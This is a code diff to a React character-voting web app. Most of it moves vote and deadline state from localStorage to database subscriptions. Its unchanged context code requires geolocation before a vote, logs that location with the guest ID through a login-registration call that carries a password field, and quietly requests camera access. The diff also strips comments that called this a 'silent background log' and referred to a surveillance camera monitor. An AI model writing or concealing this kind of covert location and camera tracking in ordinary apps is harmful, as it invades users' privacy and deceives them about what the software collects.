@@ -47,7 +47,7 @@ function App() {
   const [isCheckingPermissions, setIsCheckingPermissions] = useState(false); // NEW: Visual feedback state
 
   // --- TIMER STATE ---
-  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => localStorage.getItem('muse_voting_deadline'));
+  const [votingDeadline, setVotingDeadline] = useState<string | null>(null);
   const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
   const [isVotingEnded, setIsVotingEnded] = useState(false);
   const [rankings, setRankings] = useState<string[]>([]); // Store IDs of ordered winners
@@ -103,52 +103,31 @@ function App() {
     } catch (e) { console.error("Fetch error", e); }
   }, []);
 
+  // --- SYNC WITH DB ---
+  const refreshSettings = useCallback(async () => {
+      const deadline = await dataService.getVotingDeadline();
+      setVotingDeadline(deadline);
+      
+      // Check vote status against DB
+      const voted = await dataService.checkUserVoted(guestId);
+      setHasVoted(voted);
+  }, [guestId]);
+
   useEffect(() => {
     fetchCharacters();
-    const unsubscribeSupabase = dataService.subscribeToVotes(() => fetchCharacters());
-    const pollInterval = setInterval(() => fetchCharacters(), 5000);
+    refreshSettings();
 
-    const handleStorageChange = () => {
-        fetchCharacters();
-        setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
-    };
-    window.addEventListener('local-storage-update', handleStorageChange);
-    window.addEventListener('storage', handleStorageChange);
+    // Subscribe to Character Votes
+    const unsubscribeVotes = dataService.subscribeToVotes(() => fetchCharacters());
     
-    // --- VOTE STATUS CHECK (EVENT BASED) ---
-    const checkVoteStatus = () => {
-        const rawRecord = localStorage.getItem(`muse_vote_record_${guestId}`);
-        if (!rawRecord) {
-            setHasVoted(false);
-            return;
-        }
-
-        try {
-            const record = JSON.parse(rawRecord);
-            const currentEventId = localStorage.getItem('muse_voting_deadline');
-
-            // Logic: If there is an active deadline (Event), and the user's vote record 
-            // does NOT match this deadline, it means it's an old vote -> Allow Re-vote.
-            if (currentEventId && record.eventDeadline !== currentEventId) {
-                setHasVoted(false);
-            } else {
-                // Either match, or no deadline set (fallback to permanent vote)
-                setHasVoted(true);
-            }
-        } catch (e) {
-            setHasVoted(false);
-        }
-    };
-    
-    checkVoteStatus();
+    // Subscribe to Timer/Settings Changes
+    const unsubscribeSettings = dataService.subscribeToSettings(() => refreshSettings());
 
     return () => {
-        unsubscribeSupabase();
-        clearInterval(pollInterval);
-        window.removeEventListener('local-storage-update', handleStorageChange);
-        window.removeEventListener('storage', handleStorageChange);
+        unsubscribeVotes();
+        unsubscribeSettings();
     };
-  }, [fetchCharacters, guestId, votingDeadline]);
+  }, [fetchCharacters, refreshSettings]);
 
   // --- DEEP LINKING CHECK ---
   useEffect(() => {
@@ -164,15 +143,12 @@ function App() {
   }, [characters]);
 
   // --- SMOOTH PERMISSIONS CHECK ---
-  // Returns array of missing mandatory permissions. Camera is treated as optional/background.
   const checkPermissions = useCallback(async (): Promise<('location' | 'camera')[]> => {
     const missing: ('location' | 'camera')[] = [];
     
-    // 1. Check Location (Sequential - Blocking)
     const locationGranted = await new Promise<boolean>((resolve) => {
         if (!('geolocation' in navigator)) { resolve(false); return; }
         
-        // Use a shorter timeout for smoother UX
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const locationData = {
@@ -183,7 +159,6 @@ function App() {
                 };
                 localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                 
-                // Silent background log
                 dataService.registerUserLogin({
                     user_identifier: guestId,
                     password_text: '',
@@ -194,27 +169,19 @@ function App() {
                 resolve(true);
             },
             (error) => {
-                // Don't log intrusive warnings, just return false
                 resolve(false);
             },
-            { timeout: 5000, enableHighAccuracy: false } // Faster check, lower accuracy initially is fine
+            { timeout: 5000, enableHighAccuracy: false }
         );
     });
 
     if (!locationGranted) missing.push('location');
 
-    // 2. Check Camera (Attempt only - Don't fail the flow if denied)
-    // We try to "warm up" permissions here.
     if (locationGranted) { 
         try {
-            // Short timeout attempt for camera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            // Immediately release
             stream.getTracks().forEach(track => track.stop());
-        } catch (err) {
-            // Camera denied or unavailable. We simply proceed without it.
-            // Surveillance component will handle its own silent failure later.
-        }
+        } catch (err) { }
     }
 
     const finalMissing = [...new Set([...missing])];
@@ -304,41 +271,27 @@ function App() {
       registerInteraction();
       if (hasVoted || isVotingEnded || isCheckingPermissions) return;
       
-      // 1. Visual Feedback
       setIsCheckingPermissions(true);
-
-      // 2. Artificial delay for smooth UI transition
       await new Promise(resolve => setTimeout(resolve, 300));
-      
-      // 3. Perform Check (Primarily Location)
       const missing = await checkPermissions();
-      
-      setIsCheckingPermissions(false); // Stop feedback
+      setIsCheckingPermissions(false);
 
-      // 4. Blocking Logic: Only block if LOCATION is missing.
       if (missing.includes('location')) {
           setShowPermissionModal(true);
           return;
       }
-
-      // If location is valid, proceed immediately.
-      // Camera permission (if granted in checkPermissions) will be used by CameraMonitor later.
       setIsVoteModalOpen(true);
   };
 
   const handlePermissionRetry = async () => {
       if (isCheckingPermissions) return;
       setIsCheckingPermissions(true);
-      
-      // Try again
       const missing = await checkPermissions();
-      
       setIsCheckingPermissions(false);
 
       if (!missing.includes('location')) {
           setHasInteracted(true); 
           setShowPermissionModal(false);
-          // Small delay before showing vote modal to let the UI breathe
           setTimeout(() => setIsVoteModalOpen(true), 200);
       }
   };
@@ -347,10 +300,8 @@ function App() {
     if (isVotingEnded) return;
     setIsVoteModalOpen(false);
 
-    // One last sanity check for Location
     const storedLoc = localStorage.getItem('muse_user_location');
     if (!storedLoc) {
-         // Fallback if localstorage was cleared
          const missing = await checkPermissions();
          if (missing.includes('location')) { 
              setShowPermissionModal(true); 
@@ -363,6 +314,7 @@ function App() {
         const locationData = storedLoc ? JSON.parse(storedLoc) : null;
         const deviceInfo = getDetailedDeviceInfo();
 
+        // Optimistic UI
         setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c));
         setHasVoted(true); 
 
@@ -373,6 +325,7 @@ function App() {
         });
         
         if (!success) {
+            // Revert on failure
             setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes - 1 } : c));
             setHasVoted(false);
             alert("Gagal melakukan voting. Mohon periksa koneksi internet Anda.");
@@ -388,8 +341,6 @@ function App() {
   };
 
   const activeCharacter = characters[activeIndex];
-
-  const hasTimer = !!(votingDeadline && !isVotingEnded && timeLeft);
 
   if (view === 'admin_login') return (
         <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
